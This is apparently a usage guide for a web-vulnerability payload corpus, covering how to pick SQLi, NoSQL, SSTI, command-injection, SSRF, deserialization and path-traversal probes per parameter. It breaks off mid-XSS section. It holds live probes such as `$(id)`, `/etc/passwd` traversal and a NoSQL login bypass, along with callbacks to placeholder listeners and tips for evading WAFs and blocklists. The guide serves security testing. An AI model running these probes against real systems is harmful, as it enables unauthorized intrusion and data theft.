# HOWTOUSE - Vulnerability Hunting with This Payload Corpus

This guide answers the operator's real question: *"I'm looking at a parameter (or a form, or a header). Which of these 1,353 payloads should I actually throw at it, and what are the hints that told me so?"*

The corpus is polyglot-first and signal-guaranteed, but throwing every payload at every parameter is noisy, slow, and teaches the target's WAF about you. The better workflow is:

1. **Profile the parameter** - what is the app *probably* doing with this value server-side?
2. **Pick the category** that matches the processing pipeline.
3. **Pick the pillar** (error / math / timing / OOB) that you can actually observe.
4. **Fire the minimal list first** (`ready/minimal/payloads-only.txt` - 83 payloads) for a fast sweep, then drill into category lists for depth.

This file tells you how to do step 1 and step 2.

---

## 1. Parameter & Context Profiling

Before you throw any payload, answer these five questions. Every answer prunes categories.

### Q1 - What does the value look like right now?

| Value shape | Likely backend use | First categories to try |
|---|---|---|
| Integer-looking (`id=42`, `user_id=1001`) | Database key lookup | **SQLi** (numeric), **NoSQL** (if Mongo/Redis/Couch stack), IDOR (not in this repo) |
| Short string that the app searches / filters on (`q=foo`, `name=bob`) | `WHERE col LIKE '%x%'` or a search engine query | **SQLi** (string), **Elasticsearch**, **LDAP**, **Cypher** |
| URL / URI (`url=https://...`, `callback=`, `next=`, `image_url=`) | Server-side HTTP fetch, redirect, or render | **SSRF**, **CRLF/Header**, **XSS** (if reflected back), **wkhtmltopdf**-style (if it returns a PDF) |
| File path / filename (`file=readme.txt`, `template=default`, `include=`) | Filesystem read or `include`/`require` | **Path Traversal**, **LFI → Code Injection** (PHP), **SSTI** (if `template=`) |
| Email / login field | Auth / user lookup, maybe LDAP bind | **SQLi**, **LDAP**, **NoSQL** (Mongo `$ne`) |
| HTML-ish text, rich content, comment body | Rendered back to browsers | **XSS**, **SSTI** (if server renders via a template engine) |
| XML, SOAP, SAML, RSS, SVG, DOCX upload | XML parser involved | **XXE**, **XSLT** |
| JSON body with structured keys | Object-graph construction, merge, deserialize | **NoSQL**, **Prototype Pollution**, **Deserialization**, **SSRF** (if one key is a URL) |
| Base64 blob, opaque cookie, `ViewState`, `token` | Serialized object | **Deserialization** (all frameworks) |
| Free-form string used in a "run this" context (`cmd=`, `exec=`, `code=`, `lang=`, formula/expression fields) | Code/eval sink | **Code Injection**, **OS Cmd Injection**, **EL Injection** |
| Template body / theme / report layout upload | Server-side template render | **SSTI** |
| Anything that ends up in an HTTP *header* | Response header construction | **CRLF/Header** |
| Format string-like (`printf`, log format, `.NET {0}`) | `String.Format` / `printf`-family | **Format String** |

### Q2 - What stack is behind it?

Fingerprint the stack. Don't guess.

- **Response headers**: `Server:`, `X-Powered-By:`, `Via:`.
- **Cookies**: `PHPSESSID` (PHP), `JSESSIONID` (Java), `connect.sid` (Node/Express), `_rails_session` (Ruby), `sessionid` / `csrftoken` (Django), `.AspNet.ApplicationCookie` (.NET), `laravel_session`, `ci_session`.
- **Error pages**: stack traces leak runtime (`Traceback (most recent call last):` = Python, `at java.base/...` = Java, `Error at line X of`... = Node, `Fatal error:` = PHP, `System.Exception` = .NET, `NoMethodError` = Ruby).
- **Path quirks**: `.do` / `.action` (Java), `.aspx` / `.ashx` (.NET), `.php`, `.jsp`, `.rb`, `/api/v*/` with JSON.
- **404 / default pages**: tomcat cat, Apache feather, Nginx default, Werkzeug debugger.
- **JS bundles**: filenames, comments, framework globals (`React`, `Vue`, `Angular`, `htmx`).

Language ≠ vulnerability, but it tells you which *deserialization framework*, which *template engine*, and which *database* is likely, which massively cuts payload count.

### Q3 - Can you see the response?

- **Yes, full body** → use **error** and **math** pillars.
- **Yes, but sanitized / opaque** → use **timing** (built-in sleep) or **OOB**.
- **No response at all (async worker, queue, webhook)** → use **OOB** exclusively. Timing is unreliable across async boundaries.
- **You only control input, can't see output at all** → OOB only.

### Q4 - Do you have an OOB callback?

If not, run `./tools/payloadctl prepare` anyway - but skip OOB payloads in favor of error/math/timing. Without a listener, OOB payloads are silent failures and you'll wrongly conclude the param is clean.

### Q5 - What WAF / filter is in front of you?

Does a naive `'OR 1=1--` get a 403? A 200 with the payload stripped? A 500? This tells you whether to reach for **encoded variants** (`ready/full/encoded/*`) first: URL, double-URL, base64, JSON-safe, HTML entity, hex-escaped, unicode-escaped.

---

## 2. Category-by-Category: When to Use It

Each section: **when to suspect** (visual and behavioral cues from real production apps), **cheap probes** (small tests to confirm suspicion), **where to inject**, **which file**, **pillar**.

The "when to suspect" bullets focus on real dev-world features - modern SaaS, REST/GraphQL APIs, low-code platforms, CI/CD surfaces, admin dashboards - not legacy CTF tropes. The question to ask at every parameter is: *"what is the application actually doing with this value server-side?"* - the answer tells you which category to load.

### SQLi - `sqli.txt` (211 payloads)

**When to suspect** - any parameter that plausibly ends up in a query, *even through an ORM*:

- **Feature types that reach SQL in prod**:
  - Admin tables with sortable columns, filterable reports, invoice/order line-item search.
  - Date-range dashboards, "advanced search" forms, saved filters, saved segments.
  - Bulk CSV/PDF export with query params (the export path bypasses the cached list view).
  - Pagination (`limit`, `offset`, `page`, `cursor`) - `offset` is frequently unsanitized.
  - Audience / cohort builders, rule-based segment definitions.
  - GraphQL resolvers that compose a `WHERE` clause from string args.
  - REST `?sort=name&order=asc` - `order` column and direction are almost never parameterizable by the ORM.
- **Modern-stack sinks that still break** (ORMs do *not* save you here):
  - Hibernate/JPA with JPQL string concatenation.
  - Sequelize `literal()`, `sequelize.query()`, `where: { [Op.and]: literal(...) }`.
  - Prisma `$queryRaw`/`$executeRaw` used with string concat (safe with tagged templates, dangerous with `+`).
  - Knex `db.raw()`, `whereRaw()`, `orderByRaw()`.
  - Django `extra()`, `RawSQL()`, `raw()` on managers, `.annotate(RawSQL(...))`.
  - SQLAlchemy `text()`, `literal_column()`, `session.execute(text(...))`.
  - Rails `where("name = '#{params[:name]}'")`, `.order(params[:sort])` - `.order` is the classic ORM footgun.
  - Any `ORDER BY` / `GROUP BY` column passed through unvalidated (ORMs usually can't parameterize identifiers).
  - Report builders generating SQL from user JSON DSL.
- **Visual / behavioral cues**:
  - A single `'` turns a 200 into a 500, an empty result, or a truncated response.
  - `?id=42` and `?id=42 AND 1=1` return the same row; `?id=42 AND 1=2` returns empty (boolean-blind).
  - Changing the `sort` value to garbage produces a different error than a valid column (column allowlist hint).
  - Row count / page count changes with `OR 1=1`.
  - Login returns *different* errors for `admin'` vs `admin'--` - you're watching SQL behavior differ.
  - A data-table column header has a clickable sort that appears in the URL - that column name is probably being interpolated.
  - Error leaks by vendor: `You have an error in your SQL syntax` (MySQL/MariaDB), `ORA-00933`/`ORA-00942` (Oracle), `Microsoft SQL Server`/`ODBC`/`quoted_identifier` (MSSQL), `PG::SyntaxError`/`unterminated quoted string at or near` (PostgreSQL), `SQLiteException`, `Hibernate: select`, `org.hibernate.exception.SQLGrammarException`, `Unknown column 'x' in 'field list'`, `SQLSTATE[42S22]`.
  - GraphQL errors leaking SQLSTATE codes through the `extensions` field.
- **Cheap probes** (send one, watch for behavior delta - not content):
  - `'` · `"` · `')` · `";` · `/**/` · `--` · `#`
  - `1' AND '1'='1` vs `1' AND '1'='2` (boolean-blind)
  - Numeric: `7*191` · `0+1337` · `(SELECT 1337)` · `1||1`
  - Unicode quote `U+2019` / `U+FF07` (smart-quote bypass for naive sanitizers).
- **Where to inject**: URL query params, POST body fields, JSON values, GraphQL variables, `User-Agent` / `Referer` / `X-Forwarded-For` (analytics tables), cookie values parsed server-side.
- **Which file**: `by-category/sqli.txt`. If the DB is fingerprinted, focus on dialect-specific sections (MySQL / PG / Oracle / MSSQL / SQLite / CockroachDB).
- **Pillar**: error-visible → grep vendor signatures. Blind with output → UNION + `math` (`1337`). Blind, no output → **timing** (`pg_sleep(5)`, `SLEEP(5)`, `WAITFOR DELAY '0:0:5'`, `DBMS_PIPE.RECEIVE_MESSAGE`). No timing channel → **OOB** (`xp_dirtree`, `UTL_HTTP`, MySQL `LOAD_FILE('\\\\{domain}\\x')`).

### NoSQL - `nosql.txt` (32 payloads)

**When to suspect** - modern JSON APIs over operator-aware query languages:

- **Feature types**:
  - Node/Express + Mongoose models.
  - GraphQL resolvers backed by Mongo, Firestore, DynamoDB, Realm.
  - Mobile-app BaaS (Parse Server, Supabase, AppWrite).
  - Real-time feed filters, admin dashboards with JSON query builders.
  - Redis-backed session lookups exposed via admin UIs.
  - Atlas full-text search exposed through an API.
- **Real prod anti-patterns**:
  - `User.findOne(req.body)` - entire request body reaches the query. If `pass` is an object `{$ne:null}`, Mongoose happily sends it to Mongo.
  - Filter APIs that explicitly accept operator keys (`?filter[status][$ne]=deleted`) - the app *invites* operator injection; you just extend it to auth bypass.
  - "Build your query" admin UIs exposing `$where`, `$regex`, aggregation pipelines.
  - Firestore rules weakly gating client-supplied paths.
- **Visual / behavioral cues**:
  - Login form works when you send the password as `{"$ne":null}` or `{"$gt":""}` - "logged in as the first user in the collection."
  - Search returns ALL results with `{"$regex":".*"}`.
  - The app natively accepts operator syntax in URLs (`?key[$ne]=x`) - that's your tell; the sink is already open, just extend it.
  - Response times change with `{"$where":"function(){while(true){}}"}`.
  - Errors: `MongoError`, `MongoServerError`, `CastError`, `BSONTypeError`, `E11000 duplicate key`, `MongooseError`, `$where not allowed`, `Document failed validation`.
- **Cheap probes**:
  - Swap a string value for `{"$ne":null}` · `{"$gt":""}` · `{"$regex":".*"}` · `{"$exists":true}`.
  - `?user[$ne]=x` operator-via-query-string.
  - `{"$where":"1==1"}` vs `{"$where":"1==2"}` (boolean-blind).
- **Where to inject**: JSON body fields (any value becomes `{"$op":...}`), query params in bracket syntax, Firestore document paths.
- **Which file**: `by-category/nosql.txt`. CouchDB has its own (`by-category/couchdb-injection.txt`).
- **Pillar**: math (`$where: "7*191 == 1337"`), error, timing (`while(true)` or expensive regex), OOB (Redis `SLAVEOF` / `MODULE LOAD` if exposed).

### SSTI (Server-Side Template Injection) - `ssti.txt` (206 payloads)

**When to suspect** - user input flows into a template that is *rendered* server-side. This is very specific: not every HTML reflection is SSTI, but modern SaaS is full of surfaces where it lands.

- **Feature types** (every bullet is a real, common SSTI surface in prod):
  - Transactional email templates where the customer writes the template body - `Hello {{name}}, your order #{{order_id}} shipped`. Common in e-commerce, CRM, marketing automation, transactional-email SaaS.
  - Invoice / receipt / certificate / shipping-label PDF generators with merge fields.
  - Report builders with "insert variable" buttons.
  - "Personalization" / "merge fields" / "dynamic content" features (HubSpot-, Mailchimp-, Klaviyo-style).
  - Support ticket macros / canned responses / Zendesk-style substitutions.
  - Slack-bot message formatters with `{user.name}` / `{channel}` style.
  - Low-code workflow builders with inline expressions in action bodies.
  - Headless CMS template-rendering plugins (Strapi, Directus, Payload).
  - PDF-from-template services (Puppeteer + Handlebars/EJS is the dominant modern stack; wkhtmltopdf + Jinja still exists).
  - Dev-time error pages that interpolate user input (Flask debug, Symfony dev, Rails error).
  - Email campaign preview tools that render user HTML through a template engine.
- **Visual / behavioral cues - the core test**:
  - `{{7*7}}` echoed as `49` → Jinja2, Twig, Nunjucks, Liquid, Pebble, Freemarker, Handlebars (with helpers), Mustache (rarely - most Mustache implementations won't do math).
  - `${7*7}` → `49` → Freemarker, Velocity, Thymeleaf, Kotlin string templates, JSP EL.
  - `<%= 7*7 %>` → `49` → ERB (Ruby), EJS (Node).
  - `#{7*7}` → `49` → Pug, Slim, Haml, Ruby string interp.
  - `*{7*7}` → `49` → Thymeleaf expression object.
  - `@{7*7}` → `49` → Razor (.NET).
  - **The giveaway**: the literal `{{name}}` you typed comes out as "Alice" in the rendered email. The app is evaluating braces server-side, not just echoing text.
  - Error stacks leaking engine names: `jinja2.exceptions.TemplateSyntaxError`, `freemarker.core.ParseException`, `org.apache.velocity.exception.ParseErrorException`, `Liquid::SyntaxError`, `Handlebars.SyntaxError`, EJS stack traces with line / column markers.
- **Cheap probes** (narrow the engine first, then escalate):
  - `${{<%[%'"}}%\` - one polyglot that errors out of most engines; the *shape of the error* names the engine.
  - `{{7*7}}` · `${7*7}` · `<%= 7*7 %>` · `#{7*7}` · `*{7*7}` · `@{7*7}` - which one echoes `49`?
  - Once the engine is known, escalate to `{{7*191}}` → `1337` (math pillar) and then engine-specific sandbox escapes.
- **Where to inject**: any field whose content later gets rendered - email subject / body, report title, dynamic filename, notification text, PDF heading, CMS block, support-ticket macro, "display name" fields that appear in templated emails.
- **Which file**: `by-category/ssti.txt`, filtered to the engine you detected. Engines covered: Jinja2, Mako, Tornado, EJS, Nunjucks, Pug, Twig, Smarty, ERB, Slim, Haml, Thymeleaf, Pebble, Freemarker, Velocity, Razor, Go template, Mustache, Liquid.
- **Pillar**: math (`{{7*191}}` → `1337`), timing (engine-specific sleep), OOB (`urlopen`/`URL.openStream`/`Net::HTTP`), error.

### OS Command Injection - `os-cmd-injection.txt` (120 payloads)

**When to suspect** - rare in "core" business logic of modern apps, but **common** in tool / devops / integration surfaces:

- **Feature types** (this is where OS cmd actually lives in prod):
  - **Diagnostic / network tools**: "ping this host", "traceroute", "test SMTP", "check TLS cert", "verify DNS", "resolve hostname", "port check". These *overwhelmingly* shell out to `ping`, `traceroute`, `dig`, `nslookup`, `openssl`, `nmap`.
  - Git integration: "import from GitHub URL", "clone this repo", "pull from branch" - shells to `git clone <url>`. Branch name is another sink.
  - CI / CD: build-step configuration, custom test commands, pipeline YAML with script steps, Jenkins "execute shell" steps, GitLab `.gitlab-ci.yml` custom runners.
  - Backup / restore UIs wrapping `pg_dump`, `mysqldump`, `mongodump`, `tar`, `rsync`.
  - File conversion pipelines: PDF merge (`pdftk`/`qpdf`), image resize (`convert`/`gm`), video transcode (`ffmpeg`), OCR (`tesseract`), doc conversion (`libreoffice --headless`).
  - Certificate upload features calling `openssl x509` / `openssl req`.
  - File-type inspection via `file` / `mime` command.
  - Archive extraction via `unzip`, `tar`, `7z`, `unrar`.
  - AV scanning features wrapping `clamscan`.
  - "Test webhook" buttons that curl the URL (also an SSRF surface - dual-category).
  - Kubernetes / OpenShift dashboards with "exec into pod" / `kubectl exec` surfaces.
  - IaC UIs running `terraform`, `ansible-playbook`, `helm`.
  - Router / NAS / IoT / firewall admin UIs - the classic bucket.
  - Monitoring / synthetic check tools (Pingdom, StatusCake).
- **Visual / behavioral cues**:
  - A host / IP field returns ping-looking output: `64 bytes from 1.1.1.1: icmp_seq=1 ttl=57 time=2.3 ms`.
  - A domain field returns `whois` or `dig` output.
  - A URL field returns the HTTP response body verbatim (probably `curl`).
  - A "convert" feature's error leaks `convert-im6.q16:` (ImageMagick), `ffmpeg version N-`, `gs: error`, `tar: ... Cannot open`, `unzip: cannot find`, `pdftk: error`.
  - Error strings: `sh: 1: not found`, `/bin/sh: syntax error`, `Is a directory`, `command not found`, `Exec format error`.
  - A feature has a hard timeout that suggests a subprocess wrapped with `timeout 30`.
- **Cheap probes** (inline *and* tail):
  - `; id` · `| id` · `&& id` · `|| id` · `` `id` `` · `$(id)` · `%0a id`
  - `127.0.0.1; sleep 5` in a ping field → 5+ second response = confirmed.
  - `example.com|whoami` in a hostname field.
  - Space-bypass: `${IFS}`, `$IFS$9`, `{ls,-la}`.
  - Windows: `& whoami`, `| whoami`, `%0a whoami`.
- **Where to inject**: host / IP / URL / filename fields feeding network or conversion tools. After separators: `;`, `&`, `&&`, `|`, `||`, `` ` ``, `$()`, newline (`%0a`), `%00`.
- **Which file**: `by-category/os-cmd-injection.txt`. Bash / CMD / PowerShell breakouts, IFS / glob bypass, hex.
- **Pillar**: math (`$((7*191))` → `1337`), timing (`sleep 5` / `ping -n 6 127.0.0.1`), OOB (built-in `curl`/`wget`/`nslookup`). **If you know the host language, prefer Code Injection payloads** - built-ins are more reliable than shell commands in restricted containers.

### Code Injection (eval sinks) - `code-injection.txt` (123 payloads)

**When to suspect** - "expression" / "formula" / "rule" / "script" features that let users write *logic*, not just data. These are everywhere in the modern dev world and they are the #1 RCE sink in SaaS.

- **Feature types** (all real, all common):
  - Low-code / no-code platforms - Retool, Appsmith, Budibase, ToolJet, Airtable, Baserow - "JS expression" fields in buttons, queries, and UI components.
  - BI / reporting: calculated columns, formula fields, metric expressions - Looker `LookML` expression fields, Metabase custom expressions, Superset SQL Lab + Jinja, Mode analytics.
  - Workflow automation: Zapier "Code by Zapier" steps, n8n "Function" nodes, Make (Integromat) expression fields, Pipedream workflows, Temporal activity expressions.
  - Monitoring / observability: Datadog monitor queries, Grafana expression transformations, Prometheus recording rules, Sentry alert conditions with `if` clauses.
  - Feature flag rule engines - LaunchDarkly custom rules, Flagsmith segments, Split.io attribute expressions.
  - Headless CMS field validators ("validate with JS").
  - Spreadsheet UIs with formula bars (`=EVAL(...)` exposed to a backend).
  - ML / data-science notebook platforms (Jupyter, Deepnote, Hex) - often expose cell eval.
  - Chatbot / IVR rule builders (Dialogflow, Voiceflow, Rasa).
  - Fraud-detection, ad-targeting, dynamic-pricing rule engines.
  - Serverless-function editors deploying from a web UI (Netlify, Vercel, Cloudflare Workers).
  - Admin "run this script" / "debug" / "execute" consoles.
  - Jenkins "script console" (Groovy), Confluence / Jira / Bitbucket script runners, SonarQube custom rules.
- **Visual / behavioral cues - the core test**:
  - **Math transform** is the smoking gun. Type `7*7` in a formula-like field; if you get `49` back, the server evaluated it. This single observation is the most reliable signal of *any* eval sink - language-agnostic.
  - Type `'a'+'b'` and get `'ab'`, `'a'*3` and get `'aaa'`, `2**10` and get `1024` - primitive ops are running server-side.
  - Field labels containing: `expression`, `formula`, `rule`, `filter`, `query`, `script`, `code`, `lang`, `transform`, `condition`, `predicate`, `validator`, `template`, `handler`, `callback`, `hook`, `trigger`.
  - Placeholder text in the field: `e.g. amount > 1000`, `return user.age >= 18`, `{{ data.foo.bar }}`, `// return something`.
  - "Live preview" / "Test" / "Try it" button that shows the computed result immediately - the eval is running server-side (or in a sandbox you can try to escape).
  - Language dropdown on the field (`Python | JS | Ruby`) - the eval is the entire point of the feature.
  - Error messages leak language: `SyntaxError: Unexpected token` (JS/Node), `SyntaxError`/`NameError` at line N (Python), `NoMethodError` (Ruby), `PHP Parse error`, `Lua error`, `groovy.lang.MissingPropertyException`, `CompilationFailedException`, `Execution error`.
- **Cheap probes**:
  - `7*7`, `7*191`, `2**10`, `'a'+'b'` (language-agnostic math transforms).
  - Python: `__import__('os').getcwd()`, `open('/etc/hostname').read()`.
  - Node: `process.version`, `require('os').hostname()`, `global.process.mainModule`.
  - Ruby: `RUBY_VERSION`, `` `id` `` (backtick = shell exec).
  - Groovy: `"id".execute().text`, `Runtime.getRuntime().exec("id")`.
  - Lua: `os.execute("id")`, `io.popen("id"):read("*a")`.
- **Where to inject**: *the exact field that looks like it takes code*. Do not waste eval payloads on plain text fields.
- **Which file**: `by-category/code-injection.txt`, filtered to the detected language (Python / Node / PHP / Ruby / Perl / Lua / Java ScriptEngine / Groovy).
- **Pillar**: all four. Uses language built-ins, no shell dependency - works in restricted containers where OS-cmd payloads silently fail.
- **Groovy-specific**: Jenkins, Confluence, Jira, Bitbucket, SonarQube, OpsCenter - try Groovy first on any Java-stack admin tool that advertises "script console", "pipeline script", "custom listener", or "shared library".

### Deserialization - `deserialization.txt` (232 payloads, 31 frameworks)

**When to suspect** - any opaque blob the app accepts back from the client and reconstructs into an object:

- **Feature types**:
  - "Remember me" cookies, "stay signed in" tokens, long opaque session blobs, SSO tokens that *aren't* JWTs.
  - "Export settings" / "Import settings". "Backup" / "Restore".
  - Dashboard "Save as" / "Share" features that encode filter state into a token.
  - Mobile apps syncing local state to server as opaque binary blobs.
  - Legacy ASP.NET WebForms `__VIEWSTATE` / `__EVENTVALIDATION`.
  - Spring Session with Redis (Java serialization by default).
  - Rails cookie session store (Marshal on older Rails; JSON on current).
  - Django signed cookies with pickle serializer (deprecated but present in legacy apps).
  - ML model upload: `.pkl`, `.joblib`, `.h5`, `.pt`, `.pth`, `.safetensors` - pickle sinks are **everywhere** in modern ML tooling (Hugging Face, MLflow, Weights & Biases, any internal model registry).
  - "Import Postman collection" / "Import OpenAPI" / "Import Insomnia" (YAML/JSON deserializers with type tags).
  - File uploads accepting `.yaml`, `.yml`, `.phar`, `.ser`, `.dat`, `.rb`, `.pickle`.
  - Build artifact upload in CI tools.
  - CRM "import leads" features accepting structured exports.
  - GraphQL persisted-queries with opaque hashes.
- **Visual / behavioral cues**:
  - An opaque base64 / binary blob in a cookie, header, form field, or JSON value that you can modify and re-send.
  - The blob's *shape* changes (not just bytes) after you perform actions - it's encoding object state, not a random token.
  - Round-tripping unchanged works; single-bit flips cause 500s → no MAC (or broken MAC).
  - Error pages exposing stack traces with: `ObjectInputStream.readObject` (Java), `pickle.loads` / `UnpicklingError` (Python), `PHP Notice: unserialize()` (PHP), `Psych::DisallowedClass` / `YAML.load` (Ruby), `JsonConvert.DeserializeObject<T>` / `BinaryFormatter.Deserialize` / `LosFormatter.Deserialize` (.NET), `node-serialize`, `yaml.load` warnings.
  - **See Section 3** for the full fingerprint reference - identify the framework from the first 4-8 bytes or base64 prefix *before* firing, so you load 5-15 payloads instead of 232.
- **Cheap probes** (non-destructive signal tests):
  - Flip a single bit near the middle and re-send → 500 with a deserialization stack trace = jackpot.
  - Truncate by 1 byte → `EOFException` / `unexpected end of stream` confirms the sink.
  - Match the blob's first bytes against the Section 3 cheat-card.
- **Where to inject**: the serialized sink itself. Do **not** spray deserialization payloads across random params - they won't fire, they waste requests, and they tip off WAFs.
- **Which file**: `by-category/deserialization.txt`, filtered to the framework you fingerprinted. See Section 3.
- **Pillar**: math / timing / OOB for code-exec frameworks (pickle, PyYAML, jsonpickle, node-serialize, Fastjson, XMLDecoder, BinaryFormatter, Json.NET w/ `TypeNameHandling`). Error-only for probe-first frameworks (PHP unserialize without gadgets, Ruby Marshal without gadgets, SnakeYAML without Java classes).

### SSRF - `ssrf.txt` (156 payloads)

**When to suspect** - any time the server fetches a URL on behalf of the user. This is *everywhere* in modern SaaS and it's usually the easiest RCE-adjacent bug to find.

- **Feature types** (every bullet is a real, common SSRF surface):
  - Profile avatar / logo / favicon upload-from-URL.
  - Webhook configuration ("enter your webhook URL" + a "Test" button).
  - Link unfurling / URL previews (Slack-, Discord-, Teams-, Notion-style OpenGraph fetchers).
  - "Import from URL" for documents, RSS feeds, YouTube, Vimeo, Google Docs, Dropbox, Box, OneDrive, Notion.
  - PDF generation from HTML / URL (wkhtmltopdf, Puppeteer, Playwright, Chromium headless - the output PDF's `Producer:` metadata often names the tool).
  - HTML-to-image screenshot services.
  - RSS / Atom feed aggregators, podcast ingestion (`<enclosure url=`), OPML import.
  - oEmbed / iframely embed features.
  - SAML SSO metadata URL ("fetch metadata from your IdP").
  - OAuth redirect / JWKS URL / OpenID Connect discovery URL fields.
  - Healthcheck / uptime monitoring ("enter the URL to watch").
  - DNS-verification / domain-ownership features.
  - Proxy / scraping / "fetch this page for me" tools.
  - Image processing pipelines accepting remote URLs (Cloudinary-likes, imgix-likes).
  - GraphQL introspection against a user-specified endpoint.
  - "Test connection" buttons for databases / APIs / LDAP / SMTP / IMAP / webhooks.
  - Newsletter embed-form fetchers.
  - Rich-text editors with "fetch metadata on paste".
  - CI/CD features pulling from user-supplied Git URLs.
  - "Compare this link" diff tools.
- **Visual / behavioral cues**:
  - You paste a URL, and the app renders a card / thumbnail / title / description for it - fetcher is live.
  - You paste a URL and get back a PDF / screenshot - headless browser is active.
  - User-Agent strings visible in your OOB logs: `python-requests/2.28`, `Python-urllib/3.9`, `Java/17`, `Apache-HttpClient/5`, `node-fetch/2.6`, `axios/0.21`, `Go-http-client/1.1`, `libwww-perl/6.0`, `okhttp/4.10`, `Slackbot-LinkExpanding`, `HeadlessChrome/120`, `WhatsApp/2.0`, `facebookexternalhit`, `LinkedInBot`, `TelegramBot`, `Mozilla/5.0 ... HeadlessChrome`.
  - Time delta when fetching `http://127.0.0.1:1/` (instant ECONNREFUSED) vs `http://1.1.1.1/` (slow) - tells you the fetcher ran and reveals internal reachability.
  - Different status for `http://localhost/` vs `http://google.com/` (blocklists often catch one but not both).
  - Error messages: `Connection refused`, `Name or service not known`, `unreachable`, `DNS resolution failed`, `Too many redirects`, `SSLHandshakeException`.
- **Cheap probes** (use an OOB listener - this is the single biggest OOB-pillar category):
  - `http://{your-oob}/probe1` - baseline callback, confirms fetching.
  - `http://127.0.0.1/` · `http://localhost/` · `http://[::1]/` · `http://127.1/` · `http://0/` · `http://2130706433/` (decimal) · `http://0x7f000001/` (hex) · `http://127.0.0.1.nip.io/`.
  - `http://169.254.169.254/latest/meta-data/` (AWS IMDSv1) · `http://metadata.google.internal/computeMetadata/v1/` (GCP, needs `Metadata-Flavor: Google`) · `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (Azure, needs `Metadata: true`).
  - `file:///etc/passwd` · `file:///c:/windows/win.ini` · `gopher://`, `dict://`, `ftp://`, `ldap://`.
  - DNS rebinding / 302 chains: `http://{your-oob-redirector}/` → 302 to internal target.
- **Where to inject**: the URL param itself. Also hidden SSRF via `Host` header, `X-Forwarded-Host`, SVG `<image href>`, XML `<!ENTITY>`, PDF `<uri>`, markdown image links, OGP meta tags in fetched content.
- **Which file**: `by-category/ssrf.txt`. Cloud metadata, IP-bypass encodings, protocol schemes, DNS rebinding primitives, internal-service probes.
- **Pillar**: **OOB is primary** - no listener, no reliable detection. Error / math / reflected if the fetched body is echoed back. File-read via `file://`.
- **HTTPS gotcha**: many backend services enforce HTTPS and silently drop or reject plain `http://` callbacks. If your OOB payloads aren't firing, try switching every `http://` to `https://`. The easiest way is to front your listener with **ngrok** (`ngrok http 8080` gives you an `https://` URL), **Caddy** with automatic TLS on a public VPS, or any reverse proxy that terminates TLS. Your own VPS with a Let's Encrypt cert on a custom domain works too.
- **Collaborator domain blocking**: a growing number of targets explicitly block well-known OOB domains (`*.burpcollaborator.net`, `*.oastify.com`, `*.interact.sh`, `*.canarytokens.com`) in their egress allow-lists or WAF rules. When callbacks never arrive but SSRF behavior is otherwise confirmed (e.g. timing differences, error messages), stand up your own collaborator on a **custom domain** that isn't on any deny list. Burp Suite supports this natively via *Project Options → Misc → Collaborator Server* pointed at your own DNS + HTTP/S listener. Alternatively, run **interactsh-server** or a simple DNS + HTTP logger on a cheap VPS with a fresh domain.

### Path Traversal - `path-traversal.txt` (113 payloads)

**When to suspect** - any param the app treats as a filename or partial path:

- **Feature types**:
  - Downloads: invoices, reports, exports, receipts, statements, certificates, signed contracts, backups, audit logs.
  - File manager UIs (SharePoint, Nextcloud, ownCloud, WebDAV-backed apps).
  - Localization / i18n file loaders: `?locale=en`, `?lang=en_US`, `?i18n=en-GB`.
  - Theme / skin / template selectors: `?theme=default`, `?skin=dark`.
  - Documentation / help-article viewers.
  - Static asset serving with user-influenced paths.
  - Admin "download log" features.
  - Backup download features.
  - Email attachment download by name.
  - Image resize services (`?src=path/to/img.jpg&w=200`).
  - Kubernetes / OpenShift dashboards with "view pod logs".
  - Legacy PHP apps with `include($_GET['page'])` - still alive in custom LAMP builds, older WordPress plugins, and niche CMSes.
  - Legacy JSP apps with `<jsp:include page="<%= ... %>"/>`.
- **Visual / behavioral cues**:
  - A URL has a filename-ish param (`?file=report.pdf`, `?doc=latest`, `?view=index`, `?page=home`).
  - Response `Content-Type` changes with the filename → real file-serving path.
  - Changing `report.pdf` to `report.txt` returns different content (not just a canonical download).
  - 404 vs 200 reveals existence (`?file=admin.log` → 200, `?file=nonexistent.log` → 404) = filesystem lookup.
  - Errors leaking paths: `ENOENT`, `FileNotFoundException`, `java.io.FileNotFoundException`, `No such file or directory`, `Permission denied`, `SystemError: open`, `IsADirectoryError`, `C:\\inetpub\\wwwroot\\...` Windows paths.
  - URL-encoded slashes / dots in the param are silently accepted → no normalization.
- **Cheap probes**:
  - `../../../../etc/passwd` · `..%2F..%2F..%2Fetc%2Fpasswd` · `..%252f..%252f..%252fetc%252fpasswd` (double-URL).
  - Windows: `..\..\..\windows\win.ini` · `..%5c..%5c..%5cwindows%5cwin.ini`.
  - Null-byte legacy: `../../etc/passwd%00.pdf`.
  - PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`, `php://input`, `data://text/plain;base64,PD89NzIxOTE/Pg==`, `expect://id`.
  - UNC (Windows targets): `\\{your-oob}\share\x` → SMB callback.
  - Absolute: `/etc/passwd` · `/proc/self/environ` · `/proc/self/cmdline` · `/var/log/syslog`.
- **Where to inject**: filename / path params. Also `X-Original-URL`, `X-Rewrite-URL`, `Referer` if logged into file paths.
- **Which file**: `by-category/path-traversal.txt`. Linux + Windows, encoding bypass, null byte, PHP wrappers, UNC, NTFS ADS, 8.3 shortnames.
- **Pillar**: file-read (`root:x:` / `[extensions]`), error (path disclosure), OOB (UNC), math (`php://filter` base64 of `<?=7*191?>`).

### XSS - `xss.txt` (58 payloads)

**When to suspect** - user input is reflected into a response page, or stored and later rendered for another user:

- **Feature types**:
  - Search boxes / filter bars (reflected in "Results for X").
  - Comment fields, ticket descriptions, reviews, chat messages.
  - Profile bios, display names, company descriptions.
  - Rich-text editors: TinyMCE, CKEditor, Quill, Slate, ProseMirror, Draft.js, Lexical, TipTap.
  - Markdown renderers - especially `dangerouslySetInnerHTML` in React with `marked` / `remark` and insufficient sanitization.
  - **Admin-dashboard rendering of customer-submitted content** - blind XSS goldmine: support-ticket descriptions, sign-up form names, uploaded filenames, user-agent logs, error-reporter pages showing request bodies.
  - Error messages echoing query params verbatim.
  - Dynamic filenames in `Content-Disposition`.
  - PDF-from-HTML generators - XSS escalates to LFI via `file://` inside wkhtmltopdf / headless Chromium.
  - Analytics dashboards rendering raw `Referer` / `User-Agent` / `X-Forwarded-For` headers.
  - Email-to-ticket gateways rendering HTML from the email body.
  - File uploads storing SVG / HTML / XML and serving them inline.
  - Cross-tenant chat widgets.
  - CRM "view customer" pages (blind XSS - inject via customer field, fire when an agent opens the record).
- **Visual / behavioral cues**:
  - Your input appears verbatim in the HTML source (`<` not escaped to `&lt;`).
